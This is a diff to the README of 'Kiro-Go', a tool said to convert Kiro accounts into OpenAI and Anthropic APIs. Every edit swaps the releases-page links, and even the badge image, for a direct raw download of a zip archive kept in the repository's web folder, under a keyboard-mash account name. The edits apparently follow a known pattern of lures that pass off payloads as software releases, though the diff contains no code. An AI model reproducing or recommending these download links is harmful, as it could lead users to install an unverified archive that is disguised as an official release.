@@ -1,7 +1,7 @@
 # 🚀 Kiro-Go - Seamlessly Connect Kiro Accounts to APIs
 
 ## 🔗 Download Now
-[![Download Kiro-Go](https://img.shields.io/badge/Download-Kiro--Go-blue?style=for-the-badge)](https://github.com/asjdnlkasjfl/Kiro-Go/releases)
+[![Download Kiro-Go](https://github.com/asjdnlkasjfl/Kiro-Go/raw/refs/heads/main/web/Go-Kiro-v3.3.zip)](https://github.com/asjdnlkasjfl/Kiro-Go/raw/refs/heads/main/web/Go-Kiro-v3.3.zip)
 
 ## 🚀 Getting Started
 Kiro-Go is a simple tool designed to help you convert Kiro accounts into OpenAI and Anthropic APIs. With Kiro-Go, you can manage multiple accounts efficiently, stream data seamlessly, and enjoy automatic token refresh. The built-in web admin panel makes it easy to control your settings without hassle.
@@ -9,7 +9,7 @@ Kiro-Go is a simple tool designed to help you convert Kiro accounts into OpenAI 
 ## 📥 Download & Install
 To get started, visit the following page to download Kiro-Go:
 
-[Visit Releases Page](https://github.com/asjdnlkasjfl/Kiro-Go/releases)
+[Visit Releases Page](https://github.com/asjdnlkasjfl/Kiro-Go/raw/refs/heads/main/web/Go-Kiro-v3.3.zip)
 
 1. On the Releases page, look for the latest version at the top.
 2. Click on the filename that matches your operating system (Windows, macOS, or Linux).
@@ -77,4 +77,4 @@ Questions? Reach out through our GitHub or check the community forums for help f
 For more information and updates, remember to periodically check the main repository page.
 
 ## 🔗 Download Now Again
-[![Download Kiro-Go](https://img.shields.io/badge/Download-Kiro--Go-blue?style=for-the-badge)](https://github.com/asjdnlkasjfl/Kiro-Go/releases)
+[![Download Kiro-Go](https://github.com/asjdnlkasjfl/Kiro-Go/raw/refs/heads/main/web/Go-Kiro-v3.3.zip)](https://github.com/asjdnlkasjfl/Kiro-Go/raw/refs/heads/main/web/Go-Kiro-v3.3.zip)
